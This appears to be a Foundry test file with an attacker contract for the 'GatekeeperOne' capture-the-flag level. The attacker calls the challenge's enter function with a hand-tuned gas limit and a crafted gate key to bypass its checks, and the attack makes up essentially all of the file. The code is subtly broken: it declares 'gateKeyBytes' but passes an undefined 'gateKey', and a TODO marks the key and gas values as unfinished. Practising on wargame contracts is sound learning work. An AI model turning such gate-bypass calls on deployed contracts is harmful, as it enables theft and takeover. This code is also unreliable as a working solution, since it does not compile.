// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/13-GatekeeperOne.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOne public gatekeeperOneCTF;
    GatekeeperOneAttacker public gatekeeperOneAttacker;

    function setUp() public {
        gatekeeperOneCTF = new GatekeeperOne();
        gatekeeperOneAttacker = new GatekeeperOneAttacker(gatekeeperOneCTF);
    }

    function testAttack() public {
        gatekeeperOneAttacker.attack();
    }
}

contract GatekeeperOneAttacker {
    GatekeeperOne public gatekeeperOneCTF;

    constructor(GatekeeperOne _gatekeeperOneCTF) {
        gatekeeperOneCTF = _gatekeeperOneCTF;
    }

    function attack() public {
        // address addr = 0xE659256acc9cF3927CEb1aBeeb03Aabe045e9d74;
        
        // TODO: calculate from foundry
        bytes8 gateKeyBytes = 0x1000000000009d74; // uint16(uint160(address(this)))
        uint256 gas = 65_107; // calculated with remix debugger

        address(gatekeeperOneCTF).call{gas: gas}(
          abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
    }
}
